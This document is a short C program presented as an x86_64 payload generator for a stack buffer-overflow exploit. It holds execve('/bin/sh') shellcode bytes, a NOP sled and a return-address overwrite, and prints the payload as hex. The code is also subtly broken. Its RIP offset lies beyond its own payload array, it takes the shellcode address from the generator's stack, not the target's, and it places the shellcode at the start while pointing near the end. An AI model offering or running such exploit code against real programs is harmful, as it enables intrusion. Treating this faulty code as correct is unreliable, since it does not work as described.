**C Payload Generator (x86\_64):**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 256
#define OFFSET_TO_RIP 288 // Determined through debugging the vulnerable program

// Shellcode (replace with your desired shellcode - simple example)
unsigned char shellcode[] = {
    0x48, 0x31, 0xff,          // xor rdi, rdi
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rax, 0x68736e69622f
    0x50,                      // push rax
    0x48, 0x89, 0xe7,          // mov rdi, rsp
    0x48, 0x83, 0xec, 0x20,     // sub rsp, 0x20
    0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00, // lea rcx, [rip+0x0]
    0x48, 0x89, 0xc6,          // mov rsi, rax
    0x48, 0x31, 0xc0,          // xor rax, rax
    0xb0, 0x3b,                // mov al, 0x3b
    0x0f, 0x05,                // syscall
};

int main() {
    char payload[BUFFER_SIZE + 8]; // +8 for the overwritten RIP
    memset(payload, 0x90, BUFFER_SIZE); // Fill with NOPs

    // Copy shellcode into payload
    memcpy(payload, shellcode, sizeof(shellcode));

    // Calculate the address of the shellcode within the payload
    unsigned long shellcode_address = (unsigned long)payload + BUFFER_SIZE - sizeof(shellcode);

    // Overwrite the Return Address with the shellcode address (little-endian)
    unsigned long rip_overwrite = shellcode_address;
    memcpy(payload + OFFSET_TO_RIP, &rip_overwrite, sizeof(rip_overwrite));

    // Print the payload in hex format
    printf("Payload:\n");
    for (int i = 0; i < sizeof(payload); i++) {
        printf("%02x", (unsigned char)payload[i]);
    }
    printf("\n");

    return 0;
}
```

